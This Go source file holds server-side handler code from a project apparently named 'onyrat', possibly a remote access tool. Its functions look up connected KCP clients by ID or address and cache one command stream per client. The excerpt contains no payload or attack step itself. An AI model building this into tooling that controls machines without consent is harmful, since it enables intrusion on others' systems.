//go:build server
// +build server

package handlers

import (
	"fmt"
	"strconv"
	"sync"

	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/xtaci/smux"
)

// The stream for commands being handled by our program
const commandStream = "commandStream"

var (
	streams = make(map[string]*smux.Stream)
	mu      sync.Mutex
)

func getClient(s *network.KCPServer, addr string) (*network.KCPClient, error) {
	var client *network.KCPClient

	if id, err := strconv.Atoi(addr); err == nil {
		for _, c := range s.GetClients() {
			if c.ID == id {
				client = c
				addr = client.Sess.RemoteAddr().String()
				break
			}
		}
	} else {
		// Treat as IP:Port string
		client = s.GetClient(addr)
	}
	if client == nil {
		return nil, fmt.Errorf("client not found")
	}

	return client, nil
}

func getStream(c *network.KCPClient) (*smux.Stream, error) {
	mu.Lock()
	defer mu.Unlock()
	address := c.Sess.RemoteAddr().String()

	stream, ok := streams[address]
	if !ok {
		var err error
		stream, err = c.Manager.AcceptStream(commandStream, 0)
		if err != nil {
			return nil, fmt.Errorf("failed to accept stream: %w", err)
		}
		streams[address] = stream
	}

	return stream, nil
}
